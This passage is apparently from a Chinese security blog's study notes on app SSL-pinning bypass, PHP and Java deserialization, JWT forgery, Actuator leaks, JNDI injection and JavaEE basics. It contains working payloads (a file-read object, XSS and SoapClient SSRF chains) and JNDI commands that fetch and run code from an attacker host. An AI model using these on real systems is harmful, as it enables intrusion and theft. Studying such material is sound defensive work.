iOS），可以让用户在电脑上对手机进行全面的操作\nhttps://dl.google.com/android/repository/platform-tools-latest-windows.zip\n并配置环境变量\n2、模拟器安装 Frida注意：版本要与本地 Frida 一致下载：https://github.com/frida/frida/releases真机：ARM 版本及位数 模拟器：无 ARM 的位数getprop ro.product.cpu.abi &#x2F;&#x2F; 查看版本，可使用 termux\n本机操作：adb connect 127.0.0.1:7555adb rootadb push frida-server &#x2F;data&#x2F;localadb shellcd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;chmod 777 frida-server.&#x2F;frida-server模拟器执行：.&#x2F;frida-server本地执行：frida-U-f 包名 - 1hookjs 文件\n","slug":"APP双向认证","date":"2025-05-17T08:23:14.760Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"a9cc9e80be87d52a4207fb04988da523","title":"APP单项认证","content":"APP单项认证单项认证的绕过：没有限制过滤的抓包问题：1、抓不到-工具证书没配置好2、抓不到-app走的不是http&#x2F;s有限制过滤的抓包问题：3、抓不到-反模拟器调试4、抓不到-反代理VPN5、抓不到-反证书检验做移动安全测试时，设置好了代理，但抓不到数据包反抓包Demo：https://github.com/AndroidAppSec/vuls反调试Demo：https://github.com/lamster2018/EasyProtector \n防护手段：1、反模拟器：禁用模拟器进行调试访问 \n2、反证书检验：SSL证书绑定（单向校验和双向校验）单项校验-客户端校验服务端的证书。双向认证-客户端不仅仅要校验服务端的证书，也会在app内放一张证书；服务端也会检验客户端里的证书。 \n3、反代理VPN：代理检测、VPN检测、发包框架强制不走代理配置代理后无法访问，数据异常等连接VPN节点后无法访问，数据异常等配置代理后正常访问且无任何异常，但无数据包 \n绕过手段：-反模拟器：（某社交相亲）1、用真机2、模拟器模拟真机3、逆向删反代码重打包 \n-反证书检验：（某游戏营地）1、单向-XP框架2、双向3、逆向删反代码重打包XP框架安装：https://blog.csdn.net/weixin_49941977/article/details/121318015-反代理：1、使用电脑端的proxfiter代理\n以 MuMu Android12 为例：\n1，安装 mask 面具：\nhttps://mumu.163.com/help/20240202/35044_1136675.html#a2\n2，Lsposed\nhttps://github.com/LSPosed/LSPosed/releases/tag/v1.9.2\n并安装两个插件\nhttps://github.com/scopion/xposed-ssl-pinning\n\n","slug":"APP单项认证","date":"2025-05-17T08:20:25.669Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"ac5ba92b195ea22428b99b3d70a46fa1","title":"PHP-反序列化","content":"PHP-反序列化在 PHP 里，序列化是把一个对象或数组转换成字符串的过程（比如保存到文件或传输到网络），而反序列化就是把这个字符串还原成原来的变量（对象 &#x2F; 数组）。\n用 PHP 的两个函数表示就是：\nphp$ser = serialize($obj);     // 序列化\n$unser = unserialize($ser); // 反序列化\n为什么反序列化会存在漏洞？\n因为 unserialize() 在反序列化对象时，会自动调用一些类里面的特殊方法，比如：\nhttps://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&amp;vd_source=89bf25153801ebc942aaf90aa2af1675&amp;p=63\n\n__wakeup：反序列化时自动调用\n__seleep ()：序列化时自动调用\n__constuct：构造对象时调用\n__destruct()：对象被销毁时自动调用\n__toString()：对象被当成字符串使用时调用\n__call()：调用不存在方法时触发\n__invoke()：对象被当函数调用时触发\n__get ()：访问不存在的成员变量时调用\n__set ()：设置对象不存在的属性或无法访问（私有）的属性时调用\n__isset ()：检查对象的某个属性是否存在会执行此函数，当对不可访问的属性调用 isset () 或 empty () 时，会被自动调用\n__unset ()：在不可访问的某个属性上使用 unset 函数执行，销毁对象的某个不存在属性时自动调用__unset ()\n\n如果这些方法里面有可以被控制的敏感操作（比如文件读写、命令执行等），就可能被利用形成漏洞\nphp&lt;?php\nclass student\n&#123;\n    public $name=&quot;haohao&quot;;\n    public $age=19;\n    public $sex= &quot;man&quot;;\n \n    function aaa()\n    &#123;\n        $this-&gt;name; \n    &#125;\n&#125;\n    $demo=new student();\n    $wocao=serialize($demo);\n    echo $wocao;使用 serialize 函数进行序列化\n\nunserialize 函数进行反序列化\n\n反序列化漏洞：php&lt;?php\nclass Cat &#123;\n    public $name;\n    public $file;\n \n    function __destruct() &#123;\n        echo file_get_contents($this-&gt;file);\n    &#125;\n&#125;\n \n$payload = $_GET[&#39;data&#39;];\nunserialize($payload);攻击思路：\n在 ctf 中的解题思路\n1，复制源代码到本地2，注释掉和属性无关的内容3，根据题目需要，给属性赋值4，生成序列化数据，通常要用到 urlencode5，传递数据到服务器\nphpclass Cat &#123;\n    public $file=&quot;/etc/passwd&quot;;      //只留需要的属性,并赋值\n&#125;\n$exploit = serialize(new Cat());\necho $exploit;将 payload 上传到程序\ntxthttp://target.com/vuln.php?data=O:3:&quot;Cat&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;nya&quot;;s:4:&quot;file&quot;;s:8:&quot;/etc/passwd&quot;;&#125;  //可使用urlencode编码后再传参__wakeup 漏洞：漏洞影响范围PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10\n在反序列化一个对象时被自动调用\n在安全编程中，__wakeup() 方法经常用于控制对象的反序列化过程，以避免攻击者能够在反序列化期间执行恶意代码。这是因为反序列化操作本质上是在将一个字符串转换为可执行的代码，因此如果反序列化的对象包含恶意代码，那么它可能会在反序列化过程中执行。\n绕过：当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。\n原生类漏洞利用：php 中内置很多原生的类，在 CTF 中常以 echo new $a ($b); 这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。\n下面代码可以查看内置原生类，可对实际情况进行选择性的查看原生类\nphp&lt;?php\n$classes = get_declared_classes();\nforeach ($classes as $class) &#123;\n    $methods = get_class_methods($class);\n    foreach ($methods as $method) &#123;\n        if (in_array($method, array(\n            &#39;__destruct&#39;,\n            &#39;__toString&#39;,\n            &#39;__wakeup&#39;,\n            &#39;__call&#39;,\n            &#39;__callStatic&#39;,\n            &#39;__get&#39;,\n            &#39;__set&#39;,\n            &#39;__isset&#39;,\n            &#39;__unset&#39;,\n            &#39;__invoke&#39;,\n            &#39;__set_state&#39;\n        ))) &#123;\n            print $class . &#39;::&#39; . $method . &quot;\\n&quot;;\n        &#125;\n    &#125;\n&#125;输出结果：\nphpException::__wakeup\nException::__toString\nErrorException::__wakeup\nErrorException::__toString\nError::__wakeup\nError::__toString\nCompileError::__wakeup\nCompileError::__toString\nParseError::__wakeup\nParseError::__toString\nTypeError::__wakeup\nTypeError::__toString\nArgumentCountError::__wakeup\nArgumentCountError::__toString\nArithmeticError::__wakeup\nArithmeticError::__toString\nDivisionByZeroError::__wakeup\nDivisionByZeroError::__toString\nClosedGeneratorException::__wakeup\nClosedGeneratorException::__toString\nDateTime::__wakeup\n......以此道题为例：\n\n给了 flag.php 文件进行提示，访问的 ip 地址必须为 127.0.0.1，且 token 为 ctfshow, 才能拿下 flag\n\n进入页面，只有几行代码，考虑使用原生态利用\n调用了 getFlag () 方法，但 getFlag () 方法不存在\n使用报错类\nError&#x2F;Exception 触发 XSS\nError&#x2F;Exception 中有个__toString () 方法，能将我们输入的 xss 内容输出\nPOC 链的构造：\nphp&lt;?php\n$a = new Exception(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);\n$b = serialize($a);\necho urlencode($b);  \n?&gt;\n////输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D使用 SoapClient 构造 SSRF\n(PHP 5, PHP 7, PHP 8)\nphp&lt;?php=\n$ua=&quot;aaa\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow&quot;;\n$client = new SoapClient(null,array(&#39;url&#39; =&gt;&#39;http://127.0.0.1 &#39;,&#39;location&#39;=&gt;&#39;http://127.0.0.1/flag.php&#39;,&#39;user_agent&#39;=&gt;$ua);\necho urlencode(serialize($client)); \n?&gt;\n//将编码的数据传参拿下flag.phpPHP 字符串逃逸","slug":"PHP-反序列化","date":"2025-05-17T08:10:22.090Z","categories_index":"PHP安全","tags_index":"PHP安全","author_index":"Hao"},{"id":"38398170e5e634f3f46b2c1de62b6b21","title":"Js逆向","content":"Js逆向JS 分析调试：1，代码的全局搜索\n通过数据包找到关键词，并搜索\n2，文件流程断点\n找到对应数据包\n在发起程序中，显示了执行 js 的流程，从下往上执行的\n查看 Login js 中的代码，为登录代码\n\n下个断点，当点击登录时，代码运行此处会暂停\n\n\n将鼠标放在 logindata 变量上\n\n显示了加密信息\n\n在作用域中查看信息，发现加密信息是在 login 和 ajax 中完成的\n上面的代码中显示了加密代码\n点击 encrypt.encrypt () 发现了加密算法的文件\n\n3，代码标签断点\n右键点击登录事件，检查元素，查看登录的代码标签\n\n将登录的标签添加断点，点击中断于属性修改\n\n一但点击登录就会断点，能够查看某些数据\n缺点：有的网站可以这样使用\n4，XHR 提交断点\n先进行请求数据\n\n抓到数据包后，查看类型是否为 xhr，查看 url，选择具有代表性的地址\n\n\n在源代码页面中找到 XHR &#x2F; 提取断点，将地址输入进去，勾选内容，让浏览器去请求监控这个地址时进行断点\n\n点击登录，成功断点\n\n通过此方法找到加密算法的文件\nburp 插件 - jsEncrypterjsEncrypter：此插件使用 phantomjs 启动前端加密函数对数据进行加密，phantomjs 会返回加密结果传给 burp。因此此插件需要启动 phantomjs 开启服务，burp 去读取结果。\n需要下载 phantomjs，并且配置环境变量\n下载 jsEncrypte 插件后，在此文件中有 phantomjs_server.js，在此文件中需要将 web 中找到的加密算法的文件保存到本地，并写入此文件中，再编写要对数据加密的代码\n\n\npayload 变量是在 burp 插件中写入的\n启动 phantomjs_server.js\n\n\n成功\n用处：\n1，密码爆破：\n在 Intruder 中使用插件\n因为前端对密码进行了加密，但发现了加密算法的文件，使用此插件可对字典中的密码进行加密发送\n2，注入\n因为传入的数据会在请求包中被加密的，所以需要将注入的 payload 进行对应加密后传入参数\n比如 sql 注入 1234’ and 1&#x3D;1 — –\n\n如果数据加密，那么注入的 payload 也需要对应加密，payload 才可以生效\n","slug":"JS逆向","date":"2025-05-17T07:52:28.669Z","categories_index":"Js安全","tags_index":"Js安全","author_index":"Hao"},{"id":"7c3e14f0681c54989a322aaf4933843e","title":"Java安全学习路径","content":"参考文章：\nhttps://github.com/HackJava/HackJava\n","slug":"Java安全学习路线","date":"2025-05-17T07:27:11.184Z","categories_index":"Java安全","tags_index":"Java安全","author_index":"Hao"},{"id":"834d897a9474839bf32abbfb577a6009","title":"Java安全-反序列化","content":"Java安全-反序列化Java 安全 - 反序列化 - 原生序列化类函数序列化是将 Java 对象转换成字节流的过程。而反序列化是将字节流转换成 Java 对象的过程，java 序列化的数据一般会以标记 (ac ed 00 05) 开头，base64 编码的特征为rO0AB，JAVA 常见的序列化和反序列化的方法有 JAVA 原生序列化和 JSON 类（fastjson、jackson）序列化等。\n1、黑盒发现（流量捕获）2、白盒发现（特征类接口函数）\n1、原生序列化类函数：-SnakeYaml：完整的 YAML1.1 规范 Processor，支持 Java 对象的序列化 &#x2F; 反序列化-XMLDecoder：xml 语言格式序列化类函数接口-ObjectInputStream.readObject ()：任何类如果想要序列化必须实现java.io.Serializable 接口\n2、利用项目：\n\nYakit https://yaklang.com/\nhttps://github.com/frohoff/ysoserial\nhttps://github.com/NotSoSecure/SerializedPayloadGenerator\n\nJava 安全 - SpringBoot 框架 - 泄漏 &amp; CVESpringBoot Actuator 模块提供了生产级别的功能，比如健康检查，审计，指标收集，HTTP 跟踪等，帮助我们监控和管理 Spring Boot 应用。\n0、检测清单：https://github.com/LandGrey/SpringBootVulExploit1、黑盒发现（人工识别，BP 插件）https://github.com/API-Security/APIKit1、白盒发现（pom.xml, 引用库）org.springframework.boot spring-boot-starter-actuator\nActuator 设置全部暴露\nmanagement.endpoints.web.exposure.include&#x3D;*\n&#x2F;actuator&#x2F;env 利用：该端点可以返回全部环境变量以及一些配置信息，其中就包含了数据库配置信息\nheapdump\n利用条件:\n可正常 GET 请求目标 &#x2F;heapdump 或 &#x2F;actuator&#x2F;heapdump 接口\n利用方法:\n1、（1）下载 heapdump\n127.0.0.1:8088&#x2F;actuator&#x2F;heapdump 下载 heapdump 文件，泄露 JAVA 堆 dump 信息：\n （2）heapdump 文件解密\nhttps://github.com/wyzxxz/heapdump_tool\n2、泄漏安全（配置密码，AK&#x2F;SK 等）https://github.com/whwlsfb/JDumpSpiderhttps://github.com/wyzxxz/heapdump_tool3、漏洞安全（利用类，CVE 漏洞等）\n","slug":"Java安全-反序列化","date":"2025-05-17T07:23:49.990Z","categories_index":"Java安全","tags_index":"Java安全","author_index":"Hao"},{"id":"da36a803c898cd4beb62fc9c5e9299ef","title":"Java安全-JWT,Swagger接口,Druid监控","content":"Java安全-JWT,Swagger 接口,Druid 监控\n\n\n\n\n\n\n\n\n1，Java 安全 - Druid 监控 - 未授权访问 &amp; 信息泄漏2，Java 安全 - Swagger 接口 - 导入 &amp; 联动批量测试3，Java 安全 - JWT 令牌 - 空算法 &amp; 未签名 &amp; 密匙提取\nJava 安全 - Druid 监控 - 未授权访问 &amp; 信息泄漏参考：https://developer.aliyun.com/article/1260382Druid 是阿里巴巴数据库事业部出品，为监控而生的数据库连接池。Druid 提供的监控功能，监控 SQL 的执行时间、监控 Web URI 的请求、Session 监控。当开发者配置不当时就可能造成未授权访问漏洞。攻击点：1、直接拼接 URL 路径，尝试能否直接未授权访问系统功能点。2、结合泄露 URL 路径和 Session 信息，利用 BurpSuite 进行尝试登录。3、利用 Cookie 编辑器替换 Session，再次访问后台路径尝试进入后台。\n利用方法：\n通过目录扫描或手工输入路径 http://www.xxxx.com/druid/index.html，发现存在 Druid 未授权访问页面，重点关注 URL 监控和 Session 监控页面；\nJava 安全 - Swagger 接口 - 导入 &amp; 联动批量测试Swagger 是一个用于生成、描述和调用 RESTful 接口的 Web 服务。就是将项目中所有（想要暴露的）接口展现在页面上，并可以进行接口调用和测试的服务。所以可以对这个接口进行漏洞测试，看是否存在未授权访问、sql 注入、文件上传等漏洞。由于接口太多，一个个接口测试的话太费时间，所以一般会采用自动化接口漏洞安全测试。\n访问：http://ip:port/swagger-ui.html1、自动化发包测试Postman：https://github.com/hlmd/Postman-cn2、自动化漏洞测试联动 BurpSuite Xray 等\nJava 安全 - JWT 令牌 - 空算法 &amp; 未签名 &amp; 密匙获取JSON Web Token (JWT)。它遵循 JSON 格式，将用户信息加密到 token 里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证 token，通过 token验证用户身份。基于 token 的身份验证可以替代传统的 cookie+session 身份验证方法。这使得 JWT 成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互\nhttps://jwt.io\n1、标头（Header）\nalg 字段通常用于表示加密采用的算法。如”HS256″、”RS256″等\ntyp 字段通常用于表示类型\n2，有效载荷（Payload）\nPayload 是 JWT 的第二个部分，这是一个 JSON 对象，主要承载了各种声明并传递明文\n数据，用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明。\n3，签名（Signature）\n使用 “alg”: “none” 时，签名部分为空，直接以 . 结尾。\n\n一，空算法：\n当 alg 为 none 时没有加密算法\n可直接更改 Payload 中的信息并重新生成 base64 的编码发送\n二，未签名\n有些服务器并未验证 jwt 签名，可以直接尝试修改 payload，或者删除 Signature\n三，暴力破解密钥\n某些签名算法，例如 HS256 (HMAC+SHA-256)，会像密码一样使用一个任意的、独立的字符串作为秘密密钥。这个秘钥如被轻易猜到或暴力破解，则攻击者能以任意的头部和载荷值来创建 JT，然后用密钥重新给令牌签名。\n四，源码泄露密钥\n","slug":"Java安全-JWT-Swagger接口-Druid监控","date":"2025-05-17T07:19:36.267Z","categories_index":"Java安全","tags_index":"Java安全","author_index":"Hao"},{"id":"405d1bcee462f9653e9b6caa35fc018c","title":"Java安全-RCE执行,JNDI注入","content":"Java安全-RCE执行,JNDI注入Java 安全 - RCE 执行 - 5 大类函数调用-Groovy\n-RuntimeExec\n-ProcessImpl\n-ProcessBuilder\n-ScriptEngineManager\n检测：（大部分白盒）\n黑盒看参数名和参数值\n白盒看类函数名和可控变量\n\nJava 安全 - JNDI 注入 - RMI&amp;LDAP &amp; 版本 什么是 jndi 注入为什么有 jndi 注入\nJDNI 注入安全问题（RCE）\nJDNI 注入利用条件（看上图）\n参考：https://blog.csdn.net/dupei/article/details/120534024\n\nJNDI 全称为 Java Naming and DirectoryInterface（ Java 命名和目录接口）， 是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来 定义用户、网络、机器、对象和服务等各种资源。JNDI 支持的服务主要有：DNS、LDAP、CORBA、RMI 等。RMI：远程方法调用注册表 LDAP：轻量级目录访问协议\n调用检索：Java 为了将 Object 对象存储在 Naming 或 Directory 服务下，提供了 NamingReference 功能，对象可以通过绑定 Reference 存储在 Naming 或 Directory 服务 下，比如 RMI、LDAP 等。javax.naming.InitialContext.lookup ()在 RMI 服务中调用了 InitialContext.lookup () 的类有：\n调用检索：Java 为了将 Object 对象存储在 Naming 或 Directory 服务下，提供了 NamingReference 功能，对象可以通过绑定 Reference 存储在 Naming 或 Directory 服务 下，比如 RMI、LDAP 等。javax.naming.InitialContext.lookup ()在 RMI 服务中调用了 InitialContext.lookup () 的类有：\n","slug":"Java安全-RCE执行-JNDI注入","date":"2025-05-17T07:15:45.005Z","categories_index":"Java安全","tags_index":"Java安全","author_index":"Hao"},{"id":"35d0606ce30ad44ccc65a3edcc603a2c","title":"Java-JNDI","content":"Java-JNDIJNDI 是什么JNDI（Java Naming and Directory Interface）是一个应用程序设计的 API，一种标准的 Java 命名系统接口。\nJNDI 提供统一的客户端 API，通过不同的 JNDI 服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。\n通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的命令服务和目录服务，如下图。\n\n\n\n\n协议\n作用\n\n\n\nLDAP\n轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容\n\n\nRMI\nJAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象\n\n\nDNS\n域名服务\n\n\nCORBA\n公共对象请求代理体系结构\n\n\nJNDI 注入原理分析JNDI 注入，即当开发者在定义 JNDI 接口初始化时，lookup() 方法的参数被外部攻击者可控，攻击者就可以将恶意的 url 传入参数，以此劫持被攻击的 Java 客户端的 JNDI 请求指向恶意的服务器地址，恶意的资源服务器地址响应了一个恶意 Java 对象载荷（reference 实例 or 序列化实例），对象在被解析实例化，实例化的过程造成了注入攻击。不同的注入方法区别主要就在于利用实例化注入的方式不同。\njavapackage org.example;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\n \npublic class jndi &#123;\n    public static void main(String[] args) throws NamingException &#123;\n        String uri = &quot;rmi://127.0.0.1:1099/Exploit&quot;;    // 指定查找的 uri 变量\n        InitialContext initialContext = new InitialContext();// 得到初始目录环境的一个引用\n        initialContext.lookup(uri); // 获取指定的远程对象\n    &#125;\n&#125;代码中定义了 uri 变量，uri 变量可控，并定义了一个 rmi 协议服务， rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit 为攻击者控制的链接，最后使用 lookup () 函数进行远程获取 Exploit 类（Exploit 类名为攻击者定义，不唯一），并执行它。\nJNDI 远程调用：JNDI-Injection\n1，使用远程调用（默认端口 1389）\njavanew InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);2，利用工具生成调用地址\njavajava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A xx.xx.xx.xxJNDI 远程调用 - marshalsec\n2，利用工具生成调用地址\njavajava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A xx.xx.xx.xxJNDI 远程调用 - marshalsec\n1，使用远程端口 (默认端口 1389)\njavanew InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);2，编译对象\njavajavac Test.java  //编译为.classjava//Test.java\npublic class Calculator &#123;\n    public Calculator() throws Exception &#123;\n        Runtime.getRuntime().exec(&quot;calc&quot;);\n    &#125;\n&#125;3，使用工具生成调用协议（rmi，ldap）\njavajava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LADPRefServeer http://0.0.0.0/Test\n或者\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServeer http://0.0.0.0/Test注意：不同 JDK 版本中 JNDI 注入存在的限制及绕过方法\n\n","slug":"Java-JNDI","date":"2025-05-17T07:08:06.640Z","categories_index":"Java基础知识","tags_index":"Java基础","author_index":"Hao"},{"id":"83b6c2550820553f88f46482ca935e4b","title":"JavaEE-序列化和反序列化","content":"Java-序列化与反序列化序列化和反序列化的应用：\n两个进程在远程通信时，可以发送多种数据，包括文本、图片、音频、视频等，这些数据都是以二进制序列的形式在网络上传输。\njava 是面向对象的开发方式，一切都是 java 对象，想要在网络中传输 java 对象，可以使用序列化和反序列化去实现，发送发需要将 java 对象转换为字节序列，然后在网络上传送，接收方收到字符序列后，会通过反序列化将字节序列恢复成 java 对象。\njava 序列化的优点：\n\n实现了数据的持久化，通过序列化可以把数据持久地保存在硬盘上 (磁盘文件)。\n利用序列化实现远程通信，在网络上传输字节序列\n\n原生序列化操作\njavaimport java.io.*;\n \npublic class Main&#123;\n    public static void main(String[] args) throws IOException &#123;\n        Person p = new Person(&quot;haohao&quot;, 18, 14);\n        System.out.println(p);\n        SerializableDeamo(p);\n    &#125;\n    public static void SerializableDeamo(Person obj) throws IOException &#123;\n        //FileOutputStream()输出文件\n        //将对象obj序列化后输出到文件person.txt\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;person.txt&quot;));\n        oos.writeObject(obj);\n    &#125;\n&#125;Person.java\njavapublic class Person  &#123;\n    private String name;\n    private int age;\n    private String years;\n \n    public Person(String name, int age, int years) &#123;\n        this.name = name;\n        this.age = age;\n        this.age = years;\n        System.out.println(name + &quot; &quot; + age + &quot; &quot; + years);\n    &#125;\n \n \n    public String toString() &#123;\n        String s = &quot;Name: &quot; + name + &quot; Age: &quot; + age + &quot; Years: &quot; + age;\n        return s;\n    &#125;\n \n&#125;反序列化:\njavaimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\n \npublic class UnserializableDemo &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;\n        Object obj = unserializeTest(&quot;person.txt&quot;);\n        System.out.println(obj);\n    &#125;\n \n    public static Object unserializeTest(String filename) throws IOException, ClassNotFoundException &#123;\n        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) &#123;\n            return ois.readObject();\n        &#125;\n    &#125;\n&#125;","slug":"Java-序列化与反序列化","date":"2025-05-17T07:05:36.238Z","categories_index":"Java基础知识","tags_index":"Java基础","author_index":"Hao"},{"id":"5266ba7c44bc6a4ce52e58d685fe4590","title":"JavaEE-JDBC","content":"JavaEE-JDBC什么是 JDBC？Java 数据库连接，（Java Database Connectivity，简称 JDBC）是 Java 语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC 也是 Sun Microsystems 的商标。我们通常说的 JDBC 是面向关系型数据库的。\n简而言之，JDBC 就是 JDK 提供的关于数据库操作的一套接口规范，不同数据库厂商来负责实现这个接口，完成指定的操作。\n用程序和数据建立连接，分为三步骤：\n\n连接数据库\n\n执行 SQL 语句\n\n把查询到的结果集转换成 JAVA 对象\n\n\n安装 mysql-connector-java.jar 文件\n下载地址（官网）：MySQL :: Download Connector&#x2F;J\n（1）加载驱动程序（通过反射找到对应的 re 包）\njava// 加载Oracle“驱动类” SPI\nClass.forName(&quot;oracle.jdbc.driver.OracleDriver&quot;);\n \n//加载MySql驱动 SPI\nClass.forName(&quot;com.mysql.jdbc.Driver&quot;)（2）获取数据库连接：\njava// 创建“URL连接字符串”。格式：jdbc:oracle:thin:@ 主机名/IP : 端口号 ：服务名称\nString url = &quot;jdbc:oracle:thin:@ip:1521:sid&quot;;  //oracle\n//jdbc:mysql://ip:3306:sid   //mysql\n//jdbc:micronsoft:sqlserver://ip:1433:sid    //SqlServer\n \n// 创建“用户名”\nString username = &quot;scott&quot;;\n// 创建“密码”\nString password = &quot;123456&quot;;\n \n// 初始化“数据库连接对象”\nConnection conn = DriverManager.getConnection(url, username, password);（3）Statement 对象（对静态 sql 的执行）\nStatement 对象可以用来执行 SQL 语句，使用 executeQuery 执行查询语句，返回结果集，使用 executeUpdate 执行增删改，返回操作的行数。\njavaStatement statement = conn.createStatement();（4）结果 ResultSet 进行提取\njavaString sql = &quot;select * from users&quot;;\nResultSet rs = statement.executeQuery(sql);\n \n//取出值\nwhile(rs.next())&#123;\n    int id=rs.getInt(columnLabel:&quot;id&quot;);\n    String name=rs.getString(columnLabel:&quot;username&quot;);\n&#125;JDBC 预编译\n在 JDBC 中，预编译指的是使用 PreparedStatement 接口来执行 SQL 语句\n\n性能提升：预编译的 SQL 语句只需要解析一次，可以重复执行多次，减少了数据库解析 SQL 的时间。\n参数化查询：预编译的 SQL 语句可以使用占位符（?）代替实际值，这使得相同的 SQL 语句可以使用不同的参数值执行。\n防止 SQL 注入：预编译的 SQL 语句可以自动转义特殊字符，从而防止 SQL 注入攻击。\n\n创建预编译 Statement，并把 sql 语句传入，此时 sql 语句已与此 prepareStatement 绑定，所以执行语句时无需再把 sql 语句作为参数传入 execute ()。\n定义预编译的 sql 语句，其中待填入的参数用？占位。注意，? 无关类型，不需要加分号之类。其具体数据类型在下面 setXX（）时决定\njavaString sql = &quot;insert into student(id,name,passwd) values(?,?,?)&quot;;\nPreparedStatement ps = conn.prepareStatement(sql);java//填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。注意：问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）.\nps.setInt(1, id);\nps.setString(2, user);\nps.setInt(3, passwd);","slug":"JavaEE-JDBC","date":"2025-05-17T06:54:49.885Z","categories_index":"Java基础知识","tags_index":"Java基础","author_index":"Hao"},{"id":"6a0096bd641aa89e7faa8db26f66389c","title":"JavaEE-拦截器和过滤器","content":"JavaEE-拦截器和过滤器过滤器（Filter）：过滤器 JavaWeb 三大组件之一，它与 Servlet 很相似！过滤器是用来拦截请求的，而不是处理请求的。\n当用户请求某个 Servlet 时，会先执行部署在这个请求上的 Filter，如果 Filter “放行”，那么会继承执行用户请求的 Servlet；如果 Filter 不 “放行”，那么就不会执行用户请求的 Servlet。\n其实可以这样理解，当用户请求某个 Servlet 时，Tomcat 会去执行注册在这个请求上的 Filter，然后是否 “放行” 由 Filter 来决定。可以理解为，Filter 来决定是否调用 Servlet！当执行完成 Servlet 的代码后，还会执行 Filter 后面的代码。\n一，拦截资源路径\njava@WebServlet(&quot;/*&quot;)   //以注解的形式二，资源放行\njavafilterChain.doFilter(servletRequest, servletResponse);javapackage com.example.filter;\n \nimport javax.servlet.*;\nimport javax.servlet.annotation.WebServlet;\nimport java.io.IOException;\n \n@WebServlet(&quot;/*&quot;)   //拦截所有资源路径\npublic class Filter implements javax.servlet.Filter &#123;\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException &#123;\n        System.out.println(&quot;init filter&quot;);\n    &#125;\n \n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;\n        System.out.println(&quot;正在拦截&quot;);\n        //资源放行\n        filterChain.doFilter(servletRequest, servletResponse);\n    &#125;\n \n    @Override\n    public void destroy() &#123;\n        System.out.println(&quot;destroy filter&quot;);\n    &#125;\n&#125;过滤器应用场景1， 执行目标资源之前做预处理工作，例如设置编码，这种试通常都会放行，只是在目标资源执行之前做一些准备工作；\n2，通过条件判断是否放行，例如校验当前用户是否已经登录，或者用户 IP 是否已经被禁用；\n3，在目标资源执行后，做一些后续的特殊处理工作，例如把目标资源输出的数据进行处理；\n监听器（Listen）监听 ServletContext，HttpSession，ServletRequest 等域对象创建和销毁事件\n监听域对象的属性发生修改的事件监听 ServletContext，HttpSession，ServletRequest 等域对象创建和销毁事件\n监听域对象的属性发生修改的事件\n用途：\n\n统计在线人数和用户\n系统启动的时候加载初始化信息\n统计网站的访问量\n和 Spring 结合\n监听器分类：监听器分类：\n\n（1）第一类：按照被监听的对象划分：ServletContext 域、ServletRequest 域、HttpSession 域。（2）第二类：监听的内容划分：监听域对象的创建与销毁的监听域对象的属性变化的。\nServletContextListener\njavapackage zzs.listener;\nimport javax.servlet.ServletContextEvent;\nimport javax.servlet.ServletContextListener;\n \n@WebListener\npublic class FirstServletContextListener implements ServletContextListener&#123;\n    @Override\n    public void contextInitialized(ServletContextEvent servletContextEvent) &#123;\n        System.out.println(&quot;servletcontext初始化了&quot;);\n \n    &#125;\n    @Override\n    public void contextDestroyed(ServletContextEvent servletContextEvent) &#123;\n        System.out.println(&quot;servletcontext销毁了&quot;);\n    &#125;\n&#125;HttpSessionListener\n 监听 Httpsession 域的创建于销毁的监听器 HttpSessionListener。  HttpSession 